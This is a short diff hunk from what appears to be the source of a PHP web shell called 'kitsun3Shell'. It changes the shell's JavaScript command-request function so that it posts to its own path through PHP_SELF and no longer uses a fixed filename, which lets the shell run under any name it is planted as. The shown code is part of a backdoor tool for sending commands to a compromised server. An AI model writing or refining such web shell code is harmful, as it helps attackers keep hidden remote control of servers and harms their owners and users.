@@ -93,7 +93,7 @@ main();
             function makerequest(url, command){
                 var xhr = new XMLHttpRequest();
                 var protocol = "<?= $protocol = ($_SERVER['HTTPS'] && $_SERVER['HTTPS'] != 'off') ? 'https://' : 'http://' ?>";
-                var url = protocol + "<?= $_SERVER['SERVER_NAME'] .':'. $_SERVER['SERVER_PORT'] .'/kitsun3Shell.php' ?>";
+                var url = protocol + "<?= $_SERVER['SERVER_NAME'] .':'. $_SERVER['SERVER_PORT'] . $_SERVER['PHP_SELF'] ?>";
                 xhr.open("POST", url, true);
 
                 // Envia a informação do cabeçalho junto com a requisição.
